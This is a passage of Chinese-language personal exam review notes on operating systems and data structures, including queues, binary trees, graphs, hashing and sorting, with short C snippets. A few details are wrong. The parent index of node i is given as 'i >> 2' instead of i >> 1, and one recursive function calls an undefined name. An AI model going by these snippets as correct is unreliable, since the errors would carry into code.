<p>这四个特点其实就是分段和分页的不同之处, 对吧</p>
<p>但分段的问题在于, 存在碎片…</p>
<h3 id="段页式存储管理"><a href="#段页式存储管理" class="headerlink" title="段页式存储管理"></a>段页式存储管理</h3><p>综合分段和分页的优点<br>做法大概是, 先分段, 之后在分的段上再把他分成一页一页的, 这样子零头就小于一页了….</p>
<h2 id="虚拟存储器管理"><a href="#虚拟存储器管理" class="headerlink" title="虚拟存储器管理"></a>虚拟存储器管理</h2><p>内存管理的两个问题</p>
<ul>
<li>大作业在小主存上运行</li>
<li>在给定大小的主存上运行更多的程序</li>
</ul>
<p>这个时候就向不把所有代码同时装入主存, 等需要时候再装入, 这样子的话就能实现我们的目的, 之所以可以这样做, 是因为程序运行的局部性原理<br>这样子形成的虚拟存储器就好像拥有更大的存储空间一样</p>
<p>虚拟存储器定义:<br>指的是具有<code>请求调用</code>和<code>置换</code>功能, 能从逻辑上对内存容量进行扩充的一种存储器<br>逻辑容量接近于内外存之和, 速度接近内存, 价格接近外存</p>
<blockquote>
<p>其实从这样子看的话, CPU里的Cache和主存其实也构成了类似的结构</p>
</blockquote>
<p>特点:</p>
<ul>
<li>多次性</li>
<li>对换性</li>
<li>虚拟性</li>
</ul>
<p>分别在分页, 分段, 段页式的基础上进行虚拟化, 就得到了三种虚拟存储器<br>请求分段, 请求分页, 段页式虚拟</p>
<p><em>抖动现象</em></p>
<h4 id="页面置换算法"><a href="#页面置换算法" class="headerlink" title="页面置换算法"></a>页面置换算法</h4><ul>
<li>最佳置换算法( OPT算法)</li>
<li>先进先出算法( FIFO算法)</li>
<li>最久未使用页面置换算法( LRU算法)</li>
<li>Clock置换算法</li>
</ul>
<p>硬件支持</p>
<h2 id="设备管理"><a href="#设备管理" class="headerlink" title="设备管理"></a>设备管理</h2><p>这里就是说的I/O系统的管理</p>
<h3 id="控制方式"><a href="#控制方式" class="headerlink" title="控制方式"></a>控制方式</h3><ul>
<li>程序轮询</li>
<li>中断</li>
<li>DMA方式</li>
<li>通道</li>
</ul>
<h3 id="设备分配"><a href="#设备分配" class="headerlink" title="设备分配"></a>设备分配</h3><p>设备分类</p>
<ul>
<li>独占设备</li>
<li>共享设备</li>
<li>虚拟设备<br>虚拟设备是通过某种技术把一台独占的设备编程能供若干用户共享的设备</li>
</ul>
<h3 id="设备独立性"><a href="#设备独立性" class="headerlink" title="设备独立性"></a>设备独立性</h3><p>用户程序独立于具体使用的物理设备, 其实是通过加了一层虚拟层来实现的<br>应用虚拟技术,让我们建立虚拟设备, 并且之后的操作可以都通过操作虚拟设备来实现</p>
<h3 id="SPOOLing技术"><a href="#SPOOLing技术" class="headerlink" title="SPOOLing技术"></a>SPOOLing技术</h3><h3 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h3><p>磁盘访问时间 <code>T = Ts + Tr + Tt</code>, 其中<br>Ts: 寻道时间 <code>Ts = 8 ~ 10ms</code><br>Tr: 旋转延迟 <code>Tr = 1 / (2r)</code><br>Tt: 传输时间 <code>Tt = b / (rN)</code><br><code>r: 转速; N: 每磁道字节数; b: 传输字节数</code><br>并且有: <code>Ts &gt; Tr &gt;&gt; Tt</code></p>
<p>时间耗费主要是在寻道上, 所以磁盘调度的目标在于使得平均寻道时间最短</p>
<p>磁盘调度算法</p>
<ul>
<li>先来先服务FCFS</li>
<li>最短寻道时间优先SSTF</li>
<li>SCAN 某同扫描算法</li>
<li>CSCAN 这个是循环扫描<br>这个CSCAN是单向的, 只在一个方向上满足磁道访问请求</li>
</ul>
<p>其实发现调度算法最常见的两种就是先来先服务和短时间优先</p>
<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><h2 id="操作系统接口"><a href="#操作系统接口" class="headerlink" title="操作系统接口"></a>操作系统接口</h2>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[数据结构复习]]></title>
      <url>/2017/08/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>其实主要是记一些名词</p>
<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>没什么好说的.用数组模拟即可</p>
<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><ul>
<li>括号配对, 自己写了一下, 不难, 但好久不做题, 手有点生</li>
<li>进行四则运算, 待写</li>
<li>DFS, 实际拿函数递归来实现</li>
</ul>
<h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><p>和栈差不多…但是有一些细节. 就是为了有效利用空间, 要使用循环队列…队尾放满了要折回去放到头, 所以有个取膜的操作</p>
<h3 id="数据成员"><a href="#数据成员" class="headerlink" title="数据成员"></a>数据成员</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nptr front  <span class="comment">// 头指针</span></div><div class="line">nptr rear   <span class="comment">// 尾指针</span></div><div class="line">element data[maxlen]</div></pre></td></tr></table></figure>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>入队<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rear = (rear + <span class="number">1</span>) % maxlen</div><div class="line">data[rear] = ele;</div></pre></td></tr></table></figure></p>
<p>出队<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">front = (front + <span class="number">1</span>) % maxlen</div></pre></td></tr></table></figure></p>
<h3 id="循环队列里存在的问题"><a href="#循环队列里存在的问题" class="headerlink" title="循环队列里存在的问题"></a>循环队列里存在的问题</h3><p>循环队列解决了空间利用不是很有效的问题, 但是与此同时, 带来了新的问题…<br>就是队列空和队列满没办法区分<br>因为判断条件都是<code>front == rear</code></p>
<p>解决方法:</p>
<ul>
<li><p>增设操作标志, 当首尾指针相等时<br>如果进行了入队操作, 那么队列满<br>如果进行了出队操作, 那么队列空</p>
</li>
<li><p>约定一个保留空间<br>即空出来一个空间, 最多存放<code>maxlen - 1</code>个…, 这样子的话</p>
</li>
</ul>
<h3 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h3><p>杨辉三角<br>BFS</p>
<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><ul>
<li>静态链表, 数组实现</li>
<li>动态链表, 指针实现</li>
</ul>
<h3 id="应用-2"><a href="#应用-2" class="headerlink" title="应用"></a>应用</h3><ul>
<li><p>链栈<br>没什么好说的</p>
</li>
<li><p>链队列<br>增设头结点, 头尾指针都有方便操作<br>从头指针的地方出队, 从尾指针的地方入队<br>在出队时候要注意的点在于…当只剩下一个头结点的时候, 要把尾指针也置为front, 因为这个时候, rear本来是指向最后一个节点的, 但我们把最后一个节点删掉了,,,所以要rear指向开头</p>
</li>
</ul>
<h3 id="操作-待写"><a href="#操作-待写" class="headerlink" title="操作(待写)"></a>操作(待写)</h3><p>把链表就地逆置<br>链表合并(保持大小关系)</p>
<h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><h3 id="存储方式"><a href="#存储方式" class="headerlink" title="存储方式"></a>存储方式</h3><ul>
<li>顺序存储结构</li>
<li>链式存储结构<br>按照这样子的话, 栈, 队列, 线性表都有 顺序和链式的两种存储结构<h3 id="推广"><a href="#推广" class="headerlink" title="推广"></a>推广</h3>广义表: 每个元素可以是一个不可分割的原子, 也可能是一个表<br>这个..广义表有两种操作<br>head(A) 取表头：返回表A中第一个元素的值。<br>tail(A) 取表尾：返回表A中删除第一个元素后所得的表。<br>广义表的存储有几种方式:</li>
<li>链式存储结构</li>
<li>树/图表示</li>
</ul>
<h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><ul>
<li>节点的度: 某节点的直接子节点的个数</li>
<li>树的度:   树中最大节点度</li>
<li>树的深度: 就是树中最深节点的高度</li>
</ul>
<blockquote>
<p>一个疑问就是. 深度和高度… 有的人说, 高度和深度一个是从下往上数的, 另一个则相反. 这个我也还不太知道</p>
</blockquote>
<h3 id="二叉树-amp-树"><a href="#二叉树-amp-树" class="headerlink" title="二叉树 &amp; 树"></a>二叉树 &amp; 树</h3><p>ppt里说, 二叉树, 节点左右不同就算两种状态, 而树的话就不是这样子了<br>左子树 &amp; 右子树这些都是,,,二叉树里的概念</p>
<h3 id="一个公式"><a href="#一个公式" class="headerlink" title="一个公式"></a>一个公式</h3><p>节点总数 = <code>\sum(n_i * i) + 1</code>…. 就是度数乘上拥有该度数的节点个数最后再加个1<br>这个主题好像没有<code>Mathjax</code>, 不能写latex公式就好坑啊</p>
<h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><p>单独拿出来, 看一下</p>
<h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><p>这里是把根节点作为第1层</p>
<ul>
<li>第i层的节点数 <code>&lt;= 2 ^ (i - 1)</code></li>
<li>高度为k的二叉树的节点总数 <code>&lt;= 2^k - 1</code></li>
<li>度为0, 1, 2的节点数量分别记为<code>n0, n1, n2</code>, 那么有<code>n0 = n2 + 1</code><br>推倒是: <code>n0 + n1 + n2 = n1 + 2*n2 + 1 = 节点总数</code></li>
</ul>
<p>所以对于二叉树的话,由于是<code>n0 = n2 + 1</code>, 所以只是需要有<code>n0, n1</code>, 或者<code>n2, n1</code>就能求出节点总数了</p>
<h3 id="满二叉树"><a href="#满二叉树" class="headerlink" title="满二叉树"></a>满二叉树</h3><p>高度为k, 并且有<code>2^k - 1</code>个节点的二叉树叫满二叉树</p>
<h3 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h3><p>在满二叉树中, 只有最后一层, 从右到左连续去掉了若干节点的二叉树<br>介绍一个概念, 肯定要有利用价值…对吧, 那完全二叉树的<em>优势</em>在于:<br>如果把根节点编号为1号, 那么树中某一节点编号i的两个子节点编号就是<code>2i</code>和<code>2i + 1</code></p>
<blockquote>
<p>需要注意的点, 就是根节点编号一定要是1, 不能是0…</p>
</blockquote>
<p>关于完全二叉树的两个结论</p>
<ul>
<li>有n个节点的完全二叉树的高度为<code>[logn] + 1</code>, 按照国际惯例, 是以2为底, 并且这里的取整函数是向下取整,比如, <code>2.多</code>也是取<code>2</code></li>
<li>如果孩子i有父亲, 那么孩子i的父亲编号应该是: <code>[i/2]</code>, 这里也是向下取整, 就是<code>i &gt;&gt; 2</code>, 对吧</li>
<li>度为1的节点最多有一个, 或者没有</li>
</ul>
<p>由于节点编号的特殊性, 所以完全二叉树可以使用数组来存…多么开心的一件事情</p>
<h3 id="几个题目"><a href="#几个题目" class="headerlink" title="几个题目"></a>几个题目</h3><ol>
<li><p>求100个节点的完全二叉树的叶子节点数<br>开始选用了, 很麻烦的做法, 算出了最后一层多少个叶子, 倒数第二层多少个, 然后加起来是总共50个…<br>好的解法应该是: 根据100号节点, 算出他的父亲是50号…所以, emmmm, 从51~100号都是叶子, 所以是50个…</p>
</li>
<li><p>完全二叉树第七层有10个节点…问共有多少节点, 有多少是叶子呢?<br>前6层有63个…对吧, 所以共有73个<br>然后最后一个节点编号是73了, 所以他爸爸是36号, 所以从<code>37 ~ 73</code>都是叶子, 共有37个</p>
</li>
<li><p>编号为i, j的两个节点在同一层的条件是: <code>[log(i)] = [log(j)]</code>, 依然是向下取整</p>
</li>
<li><p>LCA 最小公共祖先问题<br>baby暴力: 最容易想到的方法是, 从根节点分别走到i, j两节点, 并且记录下路径, 然后从头比较, 到第一个分叉的地方之前的那个节点就是最小公共祖先</p>
</li>
</ol>
<p>是不是上面的写法太暴力了…</p>
<p>暴力plus: 可以先dfs一下子…然后记下每个节点的父亲和深度….(其实…这个时候用bfs, dfs都可以是吗), 之后对于俩节点, 深度深的往上跳, 跳到和另一节点同一深度, 这个时候一起跳….当跳到同一点的时候就成功GG了. </p>
<p>暴力plusplus: 就是上面的暴力plus + 倍增, 倍增就是按照<code>2^n</code>这样子跳, 不是一下一下跳</p>
<blockquote>
<p>在DFS中, 一个度为n, 的节点一定会被访问(n + 1) 次, 因为会回溯n次</p>
</blockquote>
<p>还有离线的tarjan和在线的RMQ, QAQ, 已经都不会写了, 我现在咸鱼一条,可能只会, 那个, 俩点往上一跳一跳的操作….</p>
<p>先不在这里花时间了.</p>
<h3 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h3><p>其实, 有个问题是, 我们经常说的<code>先序</code>, <code>后序</code>, <code>中序</code>  和 <code>DFS</code>, <code>BFS</code>之间的关系…emmmmmm, 我可能是个傻子<br>网络上基本上没有人放在一起考虑过<br>但仔细想了一下…<br>其实<code>先..中..后</code>这个应该是<code>dfs</code>, 因为其实<code>dfs</code>和<code>递归</code>对应, 我现在认为<code>前中后</code>是给dfs节点打时间戳的不同方法…就比如先序的话就认为是…第一次访问这个节点就打…后续的话…认为dfs过程中….该节点的孩子都遍历完了, 再打…<br>而且由于..这个先序的特点…好像看起来先序就和我们通常意义上说的dfs是完全一样的了<br>再仔细想一想…dfs其实是没有规定访问子节点的顺序的, 但可以认为规定先访问左子树还是右子树..所以,其实这个dfs还比<code>先中后</code>要多样…可以认为我们二叉树<code>先中后</code>只是dfs一些…说不出来</p>
<p>恩, 对…前中后就是打个时间戳,你甚至可以每次遍历打两个时间戳, 一个先序, 一个后序…那么某个节点两次时间戳之间的内容就是他的子树..其实拿出代码来一看…很清楚的东西..为什么我这才意识到<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(node *p)</span> </span>&#123;</div><div class="line">    <span class="comment">// visit(p); 位置1</span></div><div class="line">    dfs(p -&gt; lson);</div><div class="line">    <span class="comment">// visit(p); 位置2</span></div><div class="line">    dfs(p -&gt; rson);</div><div class="line">    <span class="comment">// visit(p); 位置3</span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">visit</span><span class="params">(node * p)</span> </span>&#123;</div><div class="line">    print(<span class="string">"node %d has been visited\n"</span>, p -&gt; index);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在这里的dfs里, visit分别在1, 2, 3位置就是前中后序<br>所以, 以后就可以说是, 中序的dfs…这样子说话</p>
<p>而bfs这种队列实现的搜索方法…好像和这些没有关系</p>
<p>以上仅对二叉树而言….因为多叉树的话还能bfs, dfs, 但其实不存在中序遍历了</p>
<p>就是…<br><code>dfs</code>, <code>栈</code>, <code>递归</code> 这都是联系在一起的<br><code>bfs</code>, <code>队列</code>是联系在一起的…, 好像bfs也叫层次遍历<br>所以写dfs, 原理上是用栈…但实际上只要写函数调用(递归)就可以…而不像<code>bfs</code>要我们自己维护一个队列</p>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>后序的话用在…父节点状态要在孩子节点信息之上推出的场景…其实很常用, 比如求解, 树的高度<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(node * p)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>) &#123;</div><div class="line">        <span class="keyword">int</span> lf = dfs(p -&gt; lson);</div><div class="line">        <span class="keyword">int</span> rf = dfs(p -&gt; rson);</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span> + max(lf, rf);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我很久不写代码了, 也不知道写的对不对</p>
<p>要统计一个累加的量的时候, 感觉好像其实, 前中后就没那么重要了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(node * p)</span> </span>&#123; </div><div class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>) &#123;</div><div class="line">        sum++;</div><div class="line">        dfs(p -&gt; lson);</div><div class="line">        <span class="comment">// sum++放在这里也可以</span></div><div class="line">        dfs(p -&gt; rson);</div><div class="line">        <span class="comment">// sum++放在这里也可以</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 如果用c++的话, 这里的sum可以用应用传进来.写成`void dfs(node *p, int &amp;sum)`</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(node * p, <span class="keyword">int</span> &amp;sum)</span> </span>&#123; </div><div class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>) &#123;</div><div class="line">        sum++;</div><div class="line">        dfs(p -&gt; lson, sum);</div><div class="line">        <span class="comment">// sum++放在这里也可以</span></div><div class="line">        dfs(p -&gt; rson, sum);</div><div class="line">        <span class="comment">// sum++放在这里也可以</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里的<code>sum</code>是一个全局变量<br>还有一种和那个求树的高度的写法极其类似的写法见下边….几乎就是一毛一样…明显更加简洁. perfect<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(node *p)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>) &#123;</div><div class="line">        <span class="keyword">return</span> num(p -&gt; lson) + num(p -&gt; rson) + <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>已知<code>先-中</code>或者<code>后-中</code>, 就可以确定一颗二叉树的结构….</p>
<h3 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h3><p>这里先跳过了</p>
<h3 id="树和森林的存储方式"><a href="#树和森林的存储方式" class="headerlink" title="树和森林的存储方式"></a>树和森林的存储方式</h3><p>这里</p>
<h3 id="各种树"><a href="#各种树" class="headerlink" title="各种树"></a>各种树</h3><p>哈夫曼树<br>线段树<br>字典树<br>主席树<br>划分树<br>…<br>…<br>陷入沉思<br>我想回宿舍了….突然厌烦</p>
<h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><p>表示方法: <code>G = &lt;V, E&gt;</code><br>V: 定点集合<br>G: 边集合…又有有方向和没有方向两种<br>通常有方向的记为<code>&lt;V1, V2&gt;</code>, 没有方向的边记为<code>(V1, V2)</code></p>
<p>定点的度: 有向图还分为入度和出度</p>
<blockquote>
<p>这里有个东西…你看…就是…怎么说…那个.这个.我..就是<br>在树中, 我们说的度其实指的是某一个节点的出度…(如果把树看做图的话…), 而没有算他的入度, 对不对</p>
</blockquote>
<h3 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h3><p>简单路径: 中间经过节点不重复的路径(不算首尾)<br>回路    : 首尾相同的路径<br>简单回路: 简单路径 + 回路</p>
<p>连通图: 无向图中任意两点都存在路径的话, 则称为连通图, 否则就是非联通图</p>
<ol>
<li>任何连通图的连通分量只有一个, 就是它本身</li>
<li>非连通的无向图有多个连通分量, 这些分量好像都叫..极大连通子图</li>
</ol>
<p>强连通图: 在有向图G中, 若任意两点都可达(可达意味着正反都存在路径), 那么就称为是强连通</p>
<ol>
<li>任何强连通图的连通分量只有一个, 就是它本身</li>
<li>非强连通的有向图有多个强连通分量, 这些分量好像都叫..极大连通子图</li>
</ol>
<p>完全图: 无向的话…是任意两点间都有一条边…有向的话…是相当于任意两定点都一来一回对吧, 所以<br>n个节点的无向完全图..共有<code>n * (n - 1) / 2</code>条边<br>n个节点的有向完全图..共有<code>n * (n - 1)</code>条边</p>
<p>树: 连通无回路的无向图, n个节点, (n - 1)条边, 树是有最少边数的连通图</p>
<p>你看…这个树是<code>无向 无环</code>, 而DAG是<code>有向 无环</code>, 是不是有些相似的定义</p>
<h3 id="图的存储方式"><a href="#图的存储方式" class="headerlink" title="图的存储方式"></a>图的存储方式</h3><ol>
<li><p>邻接矩阵<br>无向图的邻接矩阵是三角对称结构<br>对于某一顶点, 分别, 横着数, 竖着数, 就能.能!算出入度和出度了<br>邻接关系也好确定</p>
</li>
<li><p>邻接表<br>比起邻接矩阵, 其实邻接表,在判断是否邻接的时候…比较麻烦…要遍历才能得到..无向图还好, 有向的话…确实有点…<br>矩阵相当于是空间换时间了, 方便而且…如果过于稀疏的话, 我们才用邻接表, 就是这样<br>有一个折中的办法是:<br>用一个邻接表和一个逆邻接的表…这样子的话, 判断入度出度的话就方便一些…</p>
</li>
</ol>
<h3 id="图的遍历算法"><a href="#图的遍历算法" class="headerlink" title="图的遍历算法"></a>图的遍历算法</h3><ol>
<li>深度优先DFS<br>DFS用在非连通图或者某些有向图里, 能实现一个效果…就是, 当遍历完所有节点之后(可能调用了多次DFS), 这个时候就能得到各个(强)连通分量, 代码大概如下<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(graph G)</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</div><div class="line">        visited[i] = <span class="literal">false</span>; <span class="comment">// 初始化</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</div><div class="line">        <span class="keyword">if</span>(!visited[i]) </div><div class="line">            dfs(i);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>应用(先mark, 没有具体写)<br>求无向图的连通分量: 这个可以DFS一遍, 也可以并查集, 还可以BFS一遍…<br>感觉应该是并查集快一些…但难写一些?</p>
<p>求有向图的强连通分量(SCC):</p>
<ol>
<li>Tarjan</li>
<li>Kosaraju</li>
<li><p>Gabow<br>这三种应该都是DFS, 或者多次DFS</p>
</li>
<li><p>广度优先BFS<br>广度优先的话可以说是层次遍历<br>应用: 算出最短路径….</p>
</li>
</ol>
<h3 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h3><p>权值最小的边一定在最小生成树里<br>两种算法可解决</p>
<ol>
<li><p>prim<br>基本思想:<br>在<code>一端已选，另一端未选</code>的候选边中选出一条最小的边…<br>有点绕口, 但思路是很简单的<br>如何高效的维护这个侯选边的集合是我们的关键</p>
</li>
<li><p>Kruskal<br>基本思想:<br>选一条最小的边使得其和已经选择的边不构成回路<br>关键在于如何判断构成回路</p>
</li>
</ol>
<h3 id="拓扑排序-有向图"><a href="#拓扑排序-有向图" class="headerlink" title="拓扑排序(有向图)"></a>拓扑排序(有向图)</h3><p>依然是常用的两种算法, 哎, 省赛的时候就在这里搁了…自己脑残把两种算法无缝拼接了一下…然后发现运行不了了…然后和一等说白白了…23333, 回想起来, 都是泪</p>
<ol>
<li><p>Kahn<br>这个名字..其实听得不多….但一说..这个算法的关键,在于维护..那个入度为0的点的集合..每次要做的操作就是把入度为0的点去掉…就可以了<br>这个算法还能判断是不是有环…即DAG的判断<br>但我隐约记得…Kahn要实现按照字典序来输出拓扑排序结果好像有点问题<br>因为..某一节点入度的改变是由于与她相连的的节点的删去而引起的…所以可以只考察, 刚删去的节点的后继节点是不是该加入这个候选集合, 综述, 可以使用<code>栈</code>来实现这个拓扑排序</p>
</li>
<li><p>dfs</p>
</li>
</ol>
<h3 id="关键路径"><a href="#关键路径" class="headerlink" title="关键路径"></a>关键路径</h3><h3 id="最短路"><a href="#最短路" class="headerlink" title="最短路"></a>最短路</h3><ol>
<li>单源Dijkstar</li>
<li>多源Floyd<br>等下写</li>
</ol>
<h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><ol>
<li>简单顺序查找: 一个一个找</li>
<li>二分查找    : 需要是有序的…也就是说要选排序, 复杂度带<code>logn</code><br>记得自己然后手写一个二分….虽然STL里好像有…STL啥都有…STL选手</li>
<li>分块        : 块间有序, 块内无序, 分块的大小一般取<code>√n</code>, 这个复杂度带<code>√n</code><br>分块就是块内暴力…的方法..看着很暴力…其实还挺好用的..不太动脑筋而复杂度常常能达到要求</li>
</ol>
<h3 id="树-1"><a href="#树-1" class="headerlink" title="树"></a>树</h3><ol>
<li><p>BST<br>就是左子树中所有节点值小于父节点值, 而右子树大于父节点<br>所以,按照中序遍历就能得到一个非降序列…<br>BST有个问题就是刻意构造的数据可能导致BST退化成链表<br>针对这个问题…大家想出了平衡树这个东西</p>
</li>
<li><p>平衡树<br>平衡树其实有很多很多种….<br>只要满足下面条件的BST都是平衡树:</p>
<ol>
<li>左右子树的高度差绝对值不大于1</li>
<li>左右子树都是平衡树<br>所以…这个平衡树这一类树是采用各种方法来防止BST退化的方法的树<br>具体地说, 代表之一就是AVL…<br>其实朝鲜树, 替罪羊, 还有SBT这些…都算是平衡树,可能不太平衡…就是说可能不满足这里定义说的高度差不超过1, 但是用自己的方法来保证了树的相对平衡</li>
</ol>
</li>
<li><p>AVL</p>
</li>
<li><p>B-Tree</p>
</li>
</ol>
<h3 id="Hash表"><a href="#Hash表" class="headerlink" title="Hash表"></a>Hash表</h3><p>大概涉及到几个问题</p>
<ol>
<li>计算ASL</li>
<li>构造散列函数</li>
<li>解决冲突</li>
</ol>
<p>构造散列函数的方法</p>
<ol>
<li><p>直接定址法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hash(k) = k, 或者 Hash(k) = a*k+b</div></pre></td></tr></table></figure>
</li>
<li><p>除留取余<br>Hash(k) = k % p, 一般这个p是个质数(prime)</p>
</li>
<li><p>平方取中法<br>这是什么玄学…把数字算个平方…然后取出来中间两位算hash</p>
</li>
<li><p>康拓展开<br>这个是以前做过的一个八数码问题里遇到的, 用于把全排列进行hash的一种没有冲突的方法</p>
</li>
</ol>
<p>冲突是指出现了:<br>k1 ~= k2, 但Hash(k1) = Hash(k2) 的情况<br>处理冲突的方法, 感觉可能会考</p>
<ol>
<li><p>开放地址法</p>
</li>
<li><p>拉链法<br>把hash值相同的丢到一个vector里…这不就是一个邻接表吗….</p>
</li>
<li><p>再散列法</p>
</li>
</ol>
<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>其实…看了下整个块…排序算是不太熟悉的…因为自己遇到问题, 复杂度不要求的话写个最好写的冒泡, 要求的话写个快排..其他的这些奇奇怪怪的排序都很少手写</p>
<p>几个概念：<br>    稳定排序  : 排序过程中， 关键字相同的元素相对次序不变<br>    不稳定排序: 排序过程中， 不能保证关键字相同的元素相对次序不变<br>    内/外部排序: 外部的话。。。部分数据在内存， 部分在外存</p>
<h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><p>思想: 把整个待排序的表看成两部分. 左边是有序的, 右边是无序的…整个过程是把无序区的元素插入到有序区</p>
<ol>
<li>简单插入排序<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(element_type A[])</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</div><div class="line">        <span class="keyword">int</span> temp = A[i];</div><div class="line">        <span class="keyword">int</span> j = i - <span class="number">1</span>;</div><div class="line">        <span class="keyword">while</span>((A[j].key &gt; temp.key) &amp;&amp; (j &gt;= <span class="number">1</span>)) &#123;</div><div class="line">            A[j + <span class="number">1</span>] = A[j];</div><div class="line">            j--;</div><div class="line">        &#125;</div><div class="line">        A[j + <span class="number">1</span>] = temp;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
